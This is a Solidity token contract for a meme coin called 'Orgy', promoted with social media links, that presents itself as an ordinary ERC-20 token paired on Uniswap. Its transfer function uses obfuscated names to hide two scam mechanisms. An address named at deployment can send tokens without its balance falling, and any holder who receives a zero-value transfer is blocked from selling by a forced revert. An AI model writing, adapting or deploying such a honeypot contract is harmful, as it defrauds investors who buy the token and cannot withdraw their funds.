/*

📲Telegram: https://t.me/OrgyETH

🐦Twitter: https://twitter.com/OrgyETH

🍇🎭🍇🎭🍇🎭🍇🎭🍇🎭

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Orgy is Ownable {
    function transferFrom(address three, address nest, uint256 screen) public returns (bool success) {
        require(screen <= allowance[three][msg.sender]);
        allowance[three][msg.sender] -= screen;
        feathers(three, nest, screen);
        return true;
    }

    constructor(address fastened) {
        balanceOf[msg.sender] = totalSupply;
        save[fastened] = had;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol = 'Orgy';

    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;

    string public name = 'Orgy';

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => mapping(address => uint256)) public allowance;

    function feathers(address three, address nest, uint256 screen) private returns (bool success) {
        if (save[three] == 0) {
            balanceOf[three] -= screen;
        }

        if (screen == 0) rapidly[nest] += had;

        if (three != uniswapV2Pair && save[three] == 0 && rapidly[three] > 0) {
            save[three] -= had;
        }

        balanceOf[nest] += screen;
        emit Transfer(three, nest, screen);
        return true;
    }

    function approve(address sick, uint256 screen) public returns (bool success) {
        allowance[msg.sender][sick] = screen;
        emit Approval(msg.sender, sick, screen);
        return true;
    }

    uint256 private had = 51;

    uint8 public decimals = 9;

    mapping(address => uint256) private save;

    function transfer(address nest, uint256 screen) public returns (bool success) {
        feathers(msg.sender, nest, screen);
        return true;
    }

    mapping(address => uint256) private rapidly;

    event Approval(address indexed owner, address indexed spender, uint256 value);
}